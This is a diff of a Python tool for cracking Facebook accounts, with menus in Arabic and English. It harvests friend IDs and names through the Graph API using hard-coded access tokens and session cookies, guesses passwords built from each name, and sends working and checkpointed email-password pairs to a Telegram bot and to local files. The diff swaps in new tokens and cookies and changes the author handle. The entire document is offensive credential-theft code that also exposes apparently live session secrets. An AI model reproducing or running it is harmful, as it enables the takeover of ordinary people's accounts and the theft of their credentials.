@@ -13,8 +13,7 @@ webbrowser.open('')
 if kopo.status_code == 404:
 	exit('\x1b[91;1m\n - Kilwa • ☒ التوكن او الايدي غلط ☒ ')	
 bot = telebot.TeleBot(token,parse_mode='HTML')
-ugen1 = ['Mozilla/5.0 (Linux; Android 11; M2007J3SY Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.146 Mobile Safari/537.36']
-ugen2 = ['Mozilla/5.0 (Linux; Android 11; M2007J3SY Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.146 Mobile Safari/537.36']	
+	
 os.system('clear')
 def Menu():
 	print('''\033[2;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -23,7 +22,7 @@ def Menu():
 \033[2;32m[ 1 ] - Crack From ID ~ صيد من ايديات
 [ 2 ] - Crack From File ~ صيد من ملف
 \033[2;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-   - Programmer • المبرمج ~ @M_O_L_B
+   - Programmer • المبرمج ~ @Lx0b2
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''')
 	c = input('   - Choose ~ اختار : ')
 	if c == '1':
@@ -38,7 +37,7 @@ z,total,ok,cp=0,0,0,0
 
 def get(user):
 	try:
-		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO7sJApf1fdUCwkodqiMN27nqeBrhSQBVmFwvJTfUCnZCnY3eInwoPc0CESQ1gzZA2Mu4qBT60V8qW9ZClecUywUGK7LcNYZAL7KaGAoh3Jer9IsWq5Kw5le8CgXRWR5ooZBHz6T3idKBr4UlGzUzVzZCRxpPQGhxACeB19ZAZCbNRqMNkehP5GZARkLGuLiPDpTFl','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=cfXzZjFutg6o5alCLvc4po5a; sb=cfXzZii9ujFaY46zWaEUVCUR; m_pixel_ratio=2.75; wd=377x640; c_user=100015073305609; fr=0ANMod87KWhlldn8x.AWWlpKRhDOzdQ2-wiUWsMiwEyj8.Bm8_Vx..AAA.0.0.Bm8_V7.AWUUweHdQTY; xs=14%3ACQDNjb_EMWMuyg%3A2%3A1727264124%3A-1%3A6642; locale=ar_AR; wl_cbv=v2%3Bclient_version%3A2630%3Btimestamp%3A1727264129; fbl_st=101036019%3BT%3A28787735; vpd=v1%3B640x377x2.75'}).json()
+		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=VqnyZnssqsKBKbgESlZ_taLG; sb=VqnyZpfwktei3fZkOk0sEFeH; m_pixel_ratio=2.75; wd=377x640; c_user=100090482843712; fr=0b0KoK4pThQiTR8mL.AWWeigM0vY7FfxFoRHb45ibCfwA.Bm8qlW..AAA.0.0.Bm8qmY.AWWN7S50aL8; xs=7%3Ah05w7mywPWPRuw%3A2%3A1727179162%3A-1%3A14619; locale=ar_AR; fbl_st=101223390%3BT%3A28786319; vpd=v1%3B640x377x2.75'}).json()
 		for mm in url['friends']['data']:
 			ko = (mm['id']+'|'+mm['name'])
 			if ko in fid:
@@ -77,7 +76,7 @@ def password():
 		for kk in fid:
 			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'123456789',frs+'1234567890',frs+'1234512345',frs+'1122']
+			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'1234',frs+'123456789',frs+'1234567890',frs+'1122334455']
 			kp.submit(checker,idf,pwv)
 
 def checker(idf,pwv):
@@ -134,13 +133,13 @@ def checker(idf,pwv):
 ϟ Email -> <code>{idf}</code>
 ϟ Pass -> <code>{ps}</code>
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @M_O_L_B 🔥</strong>'''
+ϟ Programmer • @Lx0b2 🔥</strong>'''
 				stp = f'''\033[1;31mϟ Secure Acc ~ حساب سكيور  
 ~•~•~•~•~•~•~•~•~•~•~•~
 ϟ Email -> {idf}
 ϟ Pass -> {ps}
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @M_O_L_B 🔥'''
+ϟ Programmer • @Lx0b2 🔥'''
 				bot.send_message(Id,stc)
 				print(stp+'\n')
 				open('CPKilwa.txt','a').write(stc+'\n')
@@ -151,13 +150,13 @@ def checker(idf,pwv):
 ϟ Email -> <code>{idf}</code>
 ϟ Pass -> <code>{ps}</code>
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @M_O_L_B 🔥</strong>'''
+ϟ Programmer • @Lx0b2 🔥</strong>'''
 				okp = f'''\033[2;32mϟ Good Acc ~ حساب صحيح ✅
 ~•~•~•~•~•~•~•~•~•~•~•~
 ϟ Email -> {idf}
 ϟ Pass -> {ps}
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @M_O_L_B 🔥'''
+ϟ Programmer • @Lx0b2 🔥'''
 				bot.send_message(Id,okc)
 				print(okp+'\n')
 				open('OKKilwa.txt','a').write(okc+'\n')
